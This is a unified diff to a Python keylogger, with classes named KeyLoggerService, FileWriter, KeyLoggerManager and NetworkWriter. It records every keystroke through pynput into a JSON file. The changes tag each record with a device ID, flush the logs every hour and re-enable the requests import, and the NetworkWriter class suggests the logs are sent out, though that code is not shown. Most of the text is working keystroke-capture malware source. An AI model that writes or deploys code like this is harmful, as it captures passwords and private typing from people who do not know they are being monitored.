@@ -2,7 +2,7 @@ import time, os
 from pynput import keyboard
 from cryptography.fernet import Fernet
 import json
-# from requests import request
+from requests import request
 
 # ===================== Service (State) =====================
 
@@ -35,11 +35,15 @@ class KeyLoggerService:
 # ===================== Writer (File Sink) =====================
 
 class FileWriter:
+    def __init__(self, device_id: str):
+        self.device_id = device_id
+
     def outing_to_file(self, character):
         with open("keyfile.json", "a", encoding="utf-8") as f:
-            for i in character:
+            for i in character:  #
                 for minute, items in i.items():
                     record = {
+                        "device_id": self.device_id,
                         "time": minute,
                         "keys": [
                             (t.char if hasattr(t, "char") and t.char else str(t))
@@ -65,9 +69,18 @@ class KeyLoggerManager:
         self.service.make_long_str(key)
         self.service.make_dict(key)
 
+        new_hour = time.strftime("%Y-%m-%d %H", time.localtime())
+        if new_hour != self.current_hour:
+            if self.service.log_l:
+                self.service.global_log.append(self.service.log_l)
+                self.writer.outing_to_file(self.service.global_log)
+                self.service.log_l = {}
+                self.service.global_log = []
+            self.current_hour = new_hour
+
         if self.service.long_str[-4:] == "exit":
             print("Detected 'exit' key:", list(self.service.long_str))
-            self.service.long_str = ""  # איפוס הזנב בלבד
+            self.service.long_str = ""
 
         elif key == keyboard.Key.space:
             self.service.global_log.append(self.service.log_l)
@@ -140,7 +153,7 @@ class NetworkWriter:
 if __name__ == "__main__":
     # Logging
     service = KeyLoggerService()
-    writer = FileWriter()
+    writer = FileWriter(device_id="MacBook Air 15")
     manager = KeyLoggerManager(service, writer)
     manager.starting_listening()
 
